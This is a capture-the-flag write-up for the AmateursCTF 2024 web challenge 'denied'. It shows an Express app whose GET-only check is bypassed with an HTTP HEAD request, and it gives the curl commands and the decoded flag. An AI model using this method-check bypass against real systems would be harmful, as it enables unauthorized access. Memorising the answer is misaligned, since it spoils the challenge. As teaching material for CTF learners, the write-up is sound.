---
title: "denied"
description: "what options do i have?"
points: 53
solves: 856
author: Jozef Steinhübl
date: April 11 2024
---

## Introduction

![task](https://raw.githubusercontent.com/GerlachSnezka/amateursctf/main/assets/2024-web-denied.png)

We have a website and source code for the website. After visiting the website, we see the response `Bad!`. We have to somehow bypass this response and get the flag.

## Solution

The website is written in JavaScript using the `express` framework and has only one route - `/`.

```javascript
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

From the source code, we can see that the website checks if the request method is `GET`. If it is, the website responds with `Bad!`. Otherwise, the website sets a cookie `flag` with the value of the environment variable `FLAG` and responds with `Winner!`.

How we're supposed to bypass `req.method == "GET"` condition? We can use the `OPTIONS` method to get all possible methods for the route `/`.

```bash
curl -X OPTIONS http://denied.amt.rs/
```

We can see that there are two methods available - `GET` and `HEAD`. We can use the `HEAD` method to bypass the condition.

```bash
curl -X HEAD http://denied.amt.rs/ -I
```

> [HEAD](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD) method is identical to [GET](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET) method, but the server does not return a message-body in the response.  
> This can be used to obtain meta-information about the entity implied by the request without transferring the entity-body itself.  
> Express automatically maps the `HEAD` method to the `.get()` method.  

The response should contain an encoded flag in the `Set-Cookie` header.

```bash
amateursCTF%7Bs0_m%40ny_0ptions...%7D
```

Then we can just decode the flag using some service or as I did, using nodejs repl.

```javascript
> decodeURIComponent("amateursCTF%7Bs0_m%40ny_0ptions...%7D")
'amateursCTF{s0_m@ny_0ptions...}'
```

Flag: `amateursCTF{s0_m@ny_0ptions...}`